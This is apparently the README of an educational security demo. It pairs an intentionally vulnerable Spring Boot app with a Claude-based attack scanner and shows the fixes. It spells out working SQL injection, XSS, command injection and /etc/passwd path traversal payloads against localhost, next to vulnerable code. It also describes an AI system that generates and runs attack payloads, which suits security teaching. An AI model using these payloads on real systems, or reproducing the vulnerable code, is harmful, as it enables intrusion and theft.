# 🔐 AI-Powered Attack/Defense Security Demo

A comprehensive educational demonstration of web application security vulnerabilities, AI-powered attack systems, and defensive countermeasures.

## 📋 Overview

This project demonstrates:

1. **Vulnerable Java Application** - A Spring Boot app with intentional security flaws
2. **AI Attack System** - Python-based scanner using Claude AI for intelligent exploitation
3. **Secured Application** - Fixed version showing security best practices

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK/DEFENSE DEMO                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────┐    Attack    ┌──────────────────────┐    │
│  │  AI Attack       │ ──────────►  │  Vulnerable Java     │    │
│  │  System          │              │  Web App             │    │
│  │  (Python/Claude) │              │  (Spring Boot)       │    │
│  └──────────────────┘              └──────────────────────┘    │
│          │                                   │                  │
│          │                                   │                  │
│          ▼                                   ▼                  │
│  ┌──────────────────┐              ┌──────────────────────┐    │
│  │  Attack Report   │              │  Secured Java        │    │
│  │  & Analysis      │              │  Web App (Fixed)     │    │
│  └──────────────────┘              └──────────────────────┘    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🚨 Vulnerabilities Demonstrated

| # | Vulnerability | OWASP | Severity | Endpoint |
|---|---------------|-------|----------|----------|
| 1 | SQL Injection | A03:2021 | CRITICAL | `/api/users/search` |
| 2 | Cross-Site Scripting (XSS) | A03:2021 | HIGH | `/api/comments` |
| 3 | Command Injection | A03:2021 | CRITICAL | `/api/ping` |
| 4 | Path Traversal | A01:2021 | HIGH | `/api/files` |
| 5 | Insecure Deserialization | A08:2021 | HIGH | `/api/deserialize` |

## 🛠️ Prerequisites

- **Java 11+** (for Spring Boot application)
- **Maven 3.6+** (for building Java app)
- **Python 3.8+** (for AI attack system)
- **Anthropic API Key** (for Claude AI integration)

## 🚀 Quick Start

### Step 1: Start the Vulnerable Application

```bash
cd vulnerable-app
mvn spring-boot:run
```

The application will start at `http://localhost:8080`

### Step 2: Setup AI Attack System

```bash
cd ai-attack-system

# Create virtual environment
python -m venv venv

# Activate (Windows)
venv\Scripts\activate

# Activate (Linux/Mac)
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Configure API key
copy .env.example .env
# Edit .env and add your ANTHROPIC_API_KEY
```

### Step 3: Run the AI Attack

```bash
python ai_attacker.py --target http://localhost:8080
```

## 📖 Detailed Demo Guide

### Part 1: Manual Vulnerability Testing

#### 1.1 SQL Injection
```bash
# Normal search
curl "http://localhost:8080/api/users/search?username=john"

# SQL Injection - Extract all users
curl "http://localhost:8080/api/users/search?username=' OR '1'='1' --"

# Result: Returns ALL users including passwords, credit cards, SSN!
```

#### 1.2 Cross-Site Scripting (XSS)
```bash
# Post a malicious comment
curl -X POST "http://localhost:8080/api/comments?author=Hacker&comment=<script>alert('XSS')</script>"

# Visit http://localhost:8080/comments to see the XSS execute
```

#### 1.3 Command Injection
```bash
# Normal ping
curl "http://localhost:8080/api/ping?host=google.com"

# Command Injection (Windows)
curl "http://localhost:8080/api/ping?host=127.0.0.1 %26%26 whoami"

# Command Injection (Linux)
curl "http://localhost:8080/api/ping?host=127.0.0.1;id"
```

#### 1.4 Path Traversal
```bash
# Normal file read
curl "http://localhost:8080/api/files?filename=readme.txt"

# Path Traversal (Windows)
curl "http://localhost:8080/api/files?filename=..\..\..\..\Windows\win.ini"

# Path Traversal (Linux)
curl "http://localhost:8080/api/files?filename=../../../../../etc/passwd"
```

### Part 2: AI-Powered Attack Demo

The AI attack system uses Claude to:
1. **Discover** - Analyze API endpoints
2. **Generate** - Create intelligent attack payloads
3. **Execute** - Run attacks against the target
4. **Analyze** - Evaluate responses for vulnerabilities
5. **Report** - Generate detailed findings with remediation advice

```bash
# Run full AI-powered scan
python ai_attacker.py -t http://localhost:8080 -o report.txt

# The AI will:
# - Generate contextual SQL injection payloads
# - Test multiple XSS vectors
# - Attempt command injection based on OS
# - Try various path traversal techniques
# - Produce a comprehensive security report
```

### Part 3: Security Fixes Demonstration

#### 3.1 SQL Injection Fix

**Vulnerable Code:**
```java
// BAD: String concatenation
String sql = "SELECT * FROM users WHERE username LIKE '%" + username + "%'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

**Secured Code:**
```java
// GOOD: Parameterized query
String sql = "SELECT * FROM users WHERE username LIKE ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, "%" + username + "%");
ResultSet rs = stmt.executeQuery();
```

#### 3.2 XSS Fix

**Vulnerable Code:**
```html
<!-- BAD: Unescaped output -->
<div th:utext="${comment.content}">Content</div>
```

**Secured Code:**
```java
// Server-side: HTML encode input
String safeComment = HtmlUtils.htmlEscape(comment);
```
```html
<!-- Template: Use th:text for auto-escaping -->
<div th:text="${comment.content}">Content</div>
```

#### 3.3 Command Injection Fix

**Vulnerable Code:**
```java
// BAD: String concatenation in shell command
String command = "ping -c 1 " + host;
Runtime.getRuntime().exec(command);
```

**Secured Code:**
```java
// GOOD: ProcessBuilder with argument array + input validation
if (!VALID_HOST_PATTERN.matcher(host).matches()) {
    throw new IllegalArgumentException("Invalid hostname");
}
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
Process process = pb.start();
```

#### 3.4 Path Traversal Fix

**Vulnerable Code:**
```java
// BAD: No path validation
String path = basePath + filename;
Files.readAllBytes(Paths.get(path));
```

**Secured Code:**
```java
// GOOD: Canonicalization and boundary check
Path baseDir = Paths.get(basePath).toAbsolutePath().normalize();
Path requestedFile = baseDir.resolve(filename).toAbsolutePath().normalize();

if (!requestedFile.startsWith(baseDir)) {
    throw new SecurityException("Path traversal detected");
}
```

## 📊 Sample Attack Report

```
════════════════════════════════════════════════════════════════════════════════
                    AI SECURITY ASSESSMENT REPORT
════════════════════════════════════════════════════════════════════════════════

Target Application: http://localhost:8080
Scan Date: 2025-01-19 10:30:45
Total Vulnerabilities: 8

SEVERITY BREAKDOWN:
- Critical: 3
- High: 4
- Medium: 1
- Low: 0

════════════════════════════════════════════════════════════════════════════════
                         DETAILED FINDINGS
════════════════════════════════════════════════════════════════════════════════

[1] SQL Injection - Data Leak
    Severity: CRITICAL
    Endpoint: /api/users/search
    Payload: ' OR '1'='1' --
    Description: SQL injection allows extraction of sensitive user data
    Evidence: Extracted 5 records with passwords and credit cards
    Remediation: Use PreparedStatement with parameterized queries
────────────────────────────────────────────────────────────────────────────────
```

## 🎓 Learning Objectives

After completing this demo, you will understand:

1. **How vulnerabilities work** - Technical details of each attack vector
2. **AI-assisted security testing** - Using LLMs for intelligent payload generation
3. **Defense strategies** - Proper coding practices to prevent vulnerabilities
4. **Security mindset** - Thinking like both attacker and defender

## ⚠️ Disclaimer

**THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY**

- Only use on systems you own or have explicit permission to test
- Do not use these techniques for malicious purposes
- The vulnerable application should NEVER be deployed in production
- Follow responsible disclosure practices

## 📚 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Spring Security](https://spring.io/projects/spring-security)
- [Anthropic Claude API](https://docs.anthropic.com/)

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

---

**Author:** Security Training Demo
**Purpose:** Educational demonstration of web application security
